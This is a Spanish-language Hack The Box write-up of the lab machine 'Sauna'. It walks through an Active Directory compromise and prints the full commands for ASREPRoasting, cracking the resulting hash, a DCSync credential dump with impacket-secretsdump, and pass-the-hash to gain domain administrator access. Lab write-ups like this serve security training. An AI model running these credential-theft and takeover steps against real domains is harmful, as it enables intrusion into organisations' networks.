---
title: "HTB: Sauna WriteUp 🪟"
date: 2024-10-20
tags:
  - ActiveDirectory
  - "#Web"
  - "#ASREProast-Attack"
  - "#Enumeration"
  - "#DCSync_Attack"
  - "#Pass-the-hash"
description: Sauna está diseñada para poner a prueba habilidades de enumeración y explotación en un entorno de Active Directory. El desafío principal consiste en obtener acceso al sistema y escalar privilegios utilizando técnicas de ataque como ASREPRoast, DCSync, y Pass-the-Hash.
---
---
# Sauna

Sauna es una máquina de Windows de dificultad fácil que destaca por la enumeración y explotación de Active Directory. Se pueden derivar posibles nombres de usuario a partir de los nombres completos de los empleados listados en el sitio web. Con estos nombres de usuario, se puede realizar un ataque ASREPRoasting, obteniendo hashes de cuentas que no requieren preautenticación Kerberos. Estos hashes pueden ser sometidos a un ataque de fuerza bruta offline para recuperar la contraseña en texto plano de un usuario que puede conectarse a la máquina mediante WinRM. Ejecutar WinPEAS revela que otro usuario del sistema está configurado para iniciar sesión automáticamente, y se identifica su contraseña. Este segundo usuario también tiene permisos de administración remota de Windows. BloodHound revela que este usuario tiene el derecho extendido DS-Replication-Get-Changes-All, lo que le permite volcar los hashes de contraseñas del Controlador de Dominio en un ataque DCSync. Ejecutar este ataque devuelve el hash del administrador principal del dominio, que puede ser usado con psexec.py de Impacket para obtener una shell en la máquina como NT_AUTHORITY\SYSTEM.


---
<figure>
<img src="/assets/img/Sauna/Sauna.png" alt="Sauna">
<figcaption>Fig 1. Sauna- HTB</figcaption>
</figure>
---
## **Escaneo inicial de puertos y servicios en máquina Active Directory con Nmap**

Empezamos la resolución de la maquina con escaneo exhaustivo de puertos con la herramienta `nmap` 

```zsh
sudo nmap -p- --open --min-rate 5000 -sS -f -Pn -n 10.10.10.175 -oG puertos 
```

Un breve resumen de cada opción de la herramienta de nmap.

| **Opción**        | **Descripción**                                                                          |
| ----------------- | ---------------------------------------------------------------------------------------- |
| `sudo`            | Ejecución del comando con privilegios de superusuario.                                   |
| `nmap`            | Herramienta nmap para escaneos en la red.                                                |
| `-p-`             | Escanea todos los puertos (del 1 al 65535).                                              |
| `--open`          | Muestra solo los puertos abiertos.                                                       |
| `--min-rate 5000` | Envía paquetes a una tasa mínima de 5000 paquetes por segundo.                           |
| `-sS`             | Realiza un escaneo SYN (también conocido como escaneo semi-abierto).                     |
| `-f`              | Fragmenta los paquetes de escaneo para evadir detección de firewall.                     |
| `-Pn`             | Desactiva la detección de host (asume que los hosts están activos).                      |
| `-n`              | Desactiva la resolución DNS (no resuelve nombres de host).                               |
| `10.10.10.175`    | Dirección IP del objetivo a escanear.                                                    |
| `-oG puertos`     | Guarda los resultados del escaneo en un archivo en formato "grepable" llamado "puertos". |

Tenemos los siguiente puertos abiertos: 
```zsh
sudo nmap -p- --open --min-rate 5000 -sS -f -Pn -n 10.10.10.175 -oG puertos 
[sudo] password for k-dot: 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-20 04:23 -05
Nmap scan report for 10.10.10.175
Host is up (0.14s latency).
Not shown: 65515 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE
53/tcp    open  domain
80/tcp    open  http
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
49667/tcp open  unknown
49673/tcp open  unknown
49674/tcp open  unknown
49677/tcp open  unknown
49689/tcp open  unknown
49697/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 66.18 seconds
```

Por los puertos abiertos que identificamos: **53**, **88** y **464**, parece que estamos tratando con una máquina que forma parte de un dominio de Active Directory. Estos puertos son típicos de servicios relacionados con el Directorio Activo, como:

- **DNS** (53)
- **Kerberos** (88)
- **Protocolo de Cambio de Contraseña de Kerberos** (464)

Dado el escaneo de puertos con **nmap**, notamos que el puerto **80** está abierto. Esto sugiere la posible existencia de un sitio web en el dominio.

Ahora debemos utilizar **Nmap** para realizar un escaneo de servicios y detectar posibles vulnerabilidades.


```zsh
sudo nmap -p53,80,88,135,139,389,445,464,593,636,3268,3269,5985,9389,49667,49673,49674,49677,49689,49697 -sS -sCV -f -Pn -n 10.10.10.175 -oN objetivos.txt
```

En el escaneo de posibles vulnerabilidades y detección de servicios, encontramos información interesante:

- El sistema utiliza **SMB2** a nivel de red, lo cual puede ser una vulnerabilidad potencial.
- El nombre del dominio es `EGOTISTICAL-BANK.LOCAL`.
- El puerto **80** está ejecutando **Microsoft IIS HTTPD 10.0**, lo que sugiere la presencia de un servidor web IIS.

```zsh
sudo nmap -p53,80,88,135,139,389,445,464,593,636,3268,3269,5985,9389,49667,49673,49674,49677,49689,49697 -sS -sCV -f -Pn -n 10.10.10.175 -oN objetivos.txt
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-20 04:35 -05
Nmap scan report for 10.10.10.175
Host is up (0.12s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Egotistical Bank :: Home
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-10-20 16:35:27Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49674/tcp open  msrpc         Microsoft Windows RPC
49677/tcp open  msrpc         Microsoft Windows RPC
49689/tcp open  msrpc         Microsoft Windows RPC
49697/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: SAUNA; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 7h00m00s
| smb2-time: 
|   date: 2024-10-20T16:36:19
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 99.96 seconds
```


---

## Exploración de Recursos Compartidos

Como primer paso, utilizaremos herramientas como `crackmapexec` o `smbclient` para escanear los recursos compartidos en la red y obtener información relevante.

```zsh
crackmapexec smb 10.10.10.175 -u 'guest' -p ''
```

<figure>
<img src="/assets/img/Sauna/imagen1.png" >
</figure>

Por el escaneo sabemos que el usuario guest esta deshabilitado así que intentamos nuevamente sin especificar ningún usuario, pero no tenemos éxito ya que acceso esta denegado. 

```zsh
crackmapexec smb 10.10.10.175 -u '' -p '' --shares 
```

<figure>
<img src="/assets/img/Sauna/imagen2.png" >
</figure>

Al no encontrar nada relevante, ahora es momento de explorar el sitio web que se encuentra en el puerto 80.

---

## Enumeración Web

El sitio luce de la siguiente manera
<figure>
<img src="/assets/img/Sauna/imagen3.png" >
</figure>

Al explorar el sitio web, en la pestaña 'Dropdown', encontramos una sección llamada 'our-team', donde se listan posibles usuarios.
<figure>
<img src="/assets/img/Sauna/imagen4.png" >
</figure>

Con esta información, podemos generar una lista de posibles usuarios utilizando varios formatos como: nombre-apellido, inicial-nombre-apellido, apellido-nombre, o inicial-apellido-nombre, para aumentar las probabilidades de éxito en la identificación de usuarios.

Hacer esto manualmente puede ser muy tedioso, por lo que creamos un script en Bash que automatiza la generación de posibles combinaciones de usuarios.

```zsh
#!/bin/bash

# Listas de nombres y apellidos
nombres=("Fergus" "Shaun" "Hugo" "Bowie" "Sophie" "Steven")
apellidos=("Smith" "Coins" "Bear" "Taylor" "Driver" "Kerb")

# Crear el archivo
archivo="variaciones_nombres.txt"
> "$archivo" # Limpiar el archivo si ya existe

# Generar variaciones de nombres y apellidos
for nombre in "${nombres[@]}"; do
    for apellido in "${apellidos[@]}"; do
        echo "${nombre}${apellido}" >> "$archivo"
        echo "${nombre:0:1}${apellido}" >> "$archivo"
        echo "${apellido}${nombre}" >> "$archivo"
        echo "${apellido:0:1}${nombre}" >> "$archivo"
    done
done

echo "Archivo creado con éxito."
```

Podemos ejecutar el script directamente con Bash o darle permisos de ejecución usando `chmod +x`. En mi caso, prefiero ejecutarlo con `bash script.sh`. Si todo funciona correctamente, recibiremos el mensaje: 'Archivo creado con éxito'. 

---

## ASREProast Attack

Ya tenemos una lista de usuarios y el nombre de dominio, pero no contamos con ninguna contraseña. Podemos intentar realizar un ataque **ASREPRoast**. 

### ¿Qué es ASREPRoast?
**ASREPRoast** es un ataque que explota una configuración específica en entornos de Active Directory (AD) que utilizan el protocolo Kerberos para la autenticación. Se trata de una técnica de **dumping de credenciales** que permite a los atacantes obtener hashes de contraseñas de cuentas de usuario que tienen deshabilitada la propiedad **"No requerir preautenticación Kerberos"**. Cuando esta propiedad está deshabilitada, los atacantes pueden solicitar datos de autenticación sin necesidad de conocer la contraseña del usuario.

### Cómo Funciona el Ataque

- **Reconocimiento**: El atacante realiza un reconocimiento para identificar cuentas con la propiedad **"No requerir preautenticación Kerberos"** deshabilitada.
- **Solicitud de TGT**: El atacante envía una solicitud de autenticación (AS-REQ) al controlador de dominio (DC) para una cuenta vulnerable.
- **Respuesta del DC**: El DC responde con un mensaje de respuesta de autenticación (AS-REP) que contiene datos cifrados con una clave derivada de la contraseña del usuario.
- **Extracción de Hashes**: El atacante extrae el hash de la contraseña del mensaje AS-REP.



Como tenemos una lista muy larga de posibles usuarios, tenemos que automatizar el proceso de la siguiente manera 

```zsh
while read user; do impacket-GetNPUsers egotistical-bank.local/"$user" -request -no-pass -dc-ip 10.10.10.175 >> hash.txt; done < variaciones_nombres.txt
```

| **Comando**                                         | **Descripción**                                                                                           |
|-----------------------------------------------------|-----------------------------------------------------------------------------------------------------------|
| `while read user; do ... done < variaciones_nombres.txt` | Lee cada línea del archivo `variaciones_nombres.txt` y la guarda en la variable `user`.                       |
| `impacket-GetNPUsers egotistical-bank.local/"$user"`| Ejecuta la herramienta `impacket-GetNPUsers` para el dominio `egotistical-bank.local` y el usuario leído.   |
| `-request`                                          | Solicita un TGT (Ticket Granting Ticket) para el usuario sin necesidad de preautenticación.               |
| `-no-pass`                                          | Especifica que no se necesita una contraseña para la solicitud.                                           |
| `-dc-ip 10.10.10.175`                               | Indica la dirección IP del controlador de dominio (DC).                                                   |
| `>> hash.txt`                                       | Guarda el resultado (hash de la contraseña) en el archivo `hash.txt`.                                      |

Mientras se ejecuta el bucle, se irá escribiendo información en el archivo `hash.txt`. Para monitorear el progreso, podemos abrir dos ventanas: una para ejecutar el script y otra para observar el avance del archivo. En este proceso, encontramos que un usuario tiene deshabilitada la opción **"No requerir preautenticación Kerberos"**.

<figure>
<img src="/assets/img/Sauna/imagen5.png" >
</figure>

En este punto, ya contamos con el nombre de usuario y el TGT (Ticket Granting Ticket). A continuación, copiaremos todo el TGT en un nuevo archivo y utilizaremos **John the Ripper** para proceder con el cracking.

Tenemos la contraseña 

```zsh
john hash --wordlist=/usr/share/wordlists/rockyou.txt                 
Using default input encoding: UTF-8
Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 256/256 AVX2 8x])
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Thestrokes23     ($krb5asrep$23$FSmith@EGOTISTICAL-BANK.LOCAL)     
1g 0:00:00:05 DONE (2024-10-20 05:30) 0.1788g/s 1885Kp/s 1885Kc/s 1885KC/s Tiffani1432..Thehunter22
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

En este punto, contamos con credenciales que se supone son válidas. Recordemos que en nuestro escaneo hemos identificado el puerto **5985** activo, que corresponde a **WinRM**. Por lo tanto, utilizaremos **CrackMapExec** para verificar nuestra suposición.

<figure>
<img src="/assets/img/Sauna/imagen6.png" >
</figure>

Tenemos el mensaje de pwn3d! por lo cual tenemos ejecución remota de comando con WinRm.

### Acceso Inicial Obtenido: Primer Usuario Comprometido

<figure>
<img src="/assets/img/Sauna/imagen7.png" >
</figure>

En el directorio desktop tendremos el archivo de la primera bandera o la bandera del usuario

### Enumeration 

Ahora debemos enumerar la máquina comprometida para tener una idea clara de los pasos a seguir y obtener privilegios como el usuario **Administrador**. Al explorar el directorio **Users**, observamos que hay tres subdirectorios correspondientes a cada usuario: uno para **Administrador**, otro para **FSmith** y el último para **svc_loanmgr**.

Con el comando net users Tenemos los mismos usuarios y se agrega el usuario **HSmith** 
<figure>
<img src="/assets/img/Sauna/imagen8.png" >
</figure>

Estuve buscando durante un tiempo formas de llevar a cabo el movimiento lateral, pero no encontré nada útil. Por lo tanto, optaré por utilizar una herramienta de automatización, como **WinPEAS**, que es una de las mejores opciones disponibles.

Para lo cual en nuestra maquina comprometida debemos crear el directorio Temp 
<figure>
<img src="/assets/img/Sauna/imagen9.png" >
</figure>
Con evil-winrm podemos utilizar el comando upload para subir el archivo 

### Lateral Movement 

Hemos descubierto que el usuario **svc_loanmanager** tiene sus credenciales configuradas para el autologin.
<figure>
<img src="/assets/img/Sauna/imagen10.png" >
</figure>
Ahora tenemos que verificar con `crackmapexec` que podemos ejecutar comandos de manera remota con WinRM.

<figure>
<img src="/assets/img/Sauna/imagen11.png" >
</figure>

y pues si tenemos ejecución remota de comando para el usuario **svc_loanmgr** 

## Escalada de Privilegios

Al comenzar la enumeración del usuario **svc_loanmgr**, no encontramos información relevante en la lista de grupos a los que pertenece el usuario.
<figure>
<img src="/assets/img/Sauna/imagen12.png" >
</figure>

Sin embargo, utilizando el comando `whoami /all`, podemos obtener una visión clara y detallada de todos los privilegios asignados a este usuario.

```powershell
Evil-WinRM* PS C:\Users\svc_loanmgr\Documents> whoami /all

USER INFORMATION
----------------

User Name                   SID
=========================== ==============================================
egotisticalbank\svc_loanmgr S-1-5-21-2966785786-3096785034-1186376766-1108


GROUP INFORMATION
-----------------

Group Name                                  Type             SID          Attributes
=========================================== ================ ============ ==================================================
Everyone                                    Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users             Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                               Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                        Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users            Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization              Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication            Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Plus Mandatory Level Label            S-1-16-8448


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled


USER CLAIMS INFORMATION
-----------------------

User claims unknown.
```

Hay varios aspectos destacados en la enumeración del usuario **svc_loanmgr**:

1. **Privilegios Importantes**:
   - **SeMachineAccountPrivilege**: Permite agregar estaciones de trabajo al dominio, lo que podría utilizarse para comprometer el dominio de manera más amplia.
   - **SeChangeNotifyPrivilege**: Permite ignorar la comprobación de permisos de travesía, lo que es bastante común en este contexto.
   - **SeIncreaseWorkingSetPrivilege**: Permite aumentar el conjunto de trabajo de un proceso, lo que puede ser útil para ciertas actividades.

2. **Grupos Pertenecientes**: El usuario está asignado a varios grupos de seguridad significativos, como **Authenticated Users**, **NTLM Authentication** y **Pre-Windows 2000 Compatible Access**.

Estos elementos sugieren que el usuario **svc_loanmgr** tiene privilegios que podrían ser explotados para realizar escalada de privilegios o movimientos laterales dentro de la red.

### Permisos de Usuario en AD usando DSACLS

Para verificar manualmente los permisos del usuario dentro del dominio, utilizamos el comando `dsacls`. El comando 

```powershell
dsacls "DC=EGOTISTICAL-BANK,DC=LOCAL" | Select-String "svc_loanmgr"
```

realiza las siguientes acciones:


1. **`dsacls "DC=EGOTISTICAL-BANK,DC=LOCAL"`**:  
   - Ejecuta el comando `dsacls` (Directory Services Access Control Lists) sobre el dominio `EGOTISTICAL-BANK.LOCAL`. Esto muestra las listas de control de acceso (ACL) para el contenedor del dominio.
   
2. **`| Select-String "svc_loanmgr"`**:  
   - Canaliza (`|`) la salida del comando `dsacls` hacia `Select-String`, que busca la cadena `svc_loanmgr` en la salida. Esto filtra y muestra únicamente las líneas que contienen `svc_loanmgr`.

En resumen, este comando verifica las ACL del dominio `EGOTISTICAL-BANK.LOCAL` y filtra los resultados para mostrar solo las líneas relacionadas con el usuario `svc_loanmgr`. Esto te permite identificar los permisos que tiene ese usuario dentro del dominio.

<figure>
<img src="/assets/img/Sauna/imagen13.png" >
</figure>
Esto indica que el usuario **svc_loanmgr** cuenta con los permisos necesarios para llevar a cabo un ataque **DCSync**:

- **Replicating Directory Changes**
- **Replicating Directory Changes All**

Esto significa que puedes proceder con un ataque DCSync para obtener hashes de contraseñas desde el controlador de dominio. 

### DCSync Attack

Para esto, utilizaremos **impacket-secretsdump** para solicitar y recibir información de replicación del controlador de dominio (DC), como si fuéramos otro controlador de dominio legítimo. El DC responderá con los datos solicitados, que incluirán hashes de contraseñas NTLM y Kerberos de los usuarios, incluidas las cuentas privilegiadas.

```zsh
impacket-secretsdump 'EGOTISTICAL-BANK/svc_loanmgr@10.10.10.175' -just-dc-ntlm  

Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

Password:

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:823452073d75b9d1cf70ebdf86c7f98e:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:4a8899428cad97676ff802229e466e2c:::
EGOTISTICAL-BANK.LOCAL\HSmith:1103:aad3b435b51404eeaad3b435b51404ee:58a52d36c84fb7f5f1beab9a201db1dd:::
EGOTISTICAL-BANK.LOCAL\FSmith:1105:aad3b435b51404eeaad3b435b51404ee:58a52d36c84fb7f5f1beab9a201db1dd:::
EGOTISTICAL-BANK.LOCAL\svc_loanmgr:1108:aad3b435b51404eeaad3b435b51404ee:9cb31797c39a9b170b04058ba2bba48c:::
SAUNA$:1000:aad3b435b51404eeaad3b435b51404ee:f4edfd6be278c363d7691ba345a2031a:::
[*] Cleaning up...
```

| **Opción**                           | **Descripción**                                                                                           |
|--------------------------------------|-----------------------------------------------------------------------------------------------------------|
| `impacket-secretsdump`               | Nombre de la herramienta utilizada para extraer hashes NTLM y otra información de Active Directory.       |
| `'EGOTISTICAL-BANK/svc_loanmgr@10.10.10.175'` | Nombre de usuario y dominio objetivo para la autenticación, incluyendo la IP del controlador de dominio.  |
| `-just-dc-ntlm`                      | Extrae solo los hashes NTLM del controlador de dominio.                                                    |

El **Pass-the-Hash** permite a los atacantes utilizar el hash NTLM de una contraseña para autenticarse en servicios remotos como si fuera la contraseña original. Esto es posible porque muchos sistemas de autenticación aceptan hashes directamente, debido a la implementación de protocolos como NTLM. Esta vulnerabilidad presenta un riesgo significativo, ya que los atacantes pueden acceder a sistemas y recursos sin necesidad de conocer la contraseña real del usuario.

```zsh
evil-winrm  -i 10.10.10.175 -u 'Administrator' -H '823452073d75b9d1cf70ebdf86c7f98e' 
```

<figure>
<img src="/assets/img/Sauna/imagen14.png" >
</figure>

Y tenemos acceso como Administrador del Dominio.

<iframe src="https://giphy.com/embed/BjNMiLuMsLL2gu4gtl" width="480" height="480" style="" frameBorder="0" class="giphy-embed" allowFullScreen></iframe>
<p><a href="https://giphy.com/gifs/WarnerMusicAfrica-happy-dance-party-BjNMiLuMsLL2gu4gtl">via GIPHY</a></p>
¡Espero que se hayan divertido explorando cómo enumerar y explotar un directorio activo!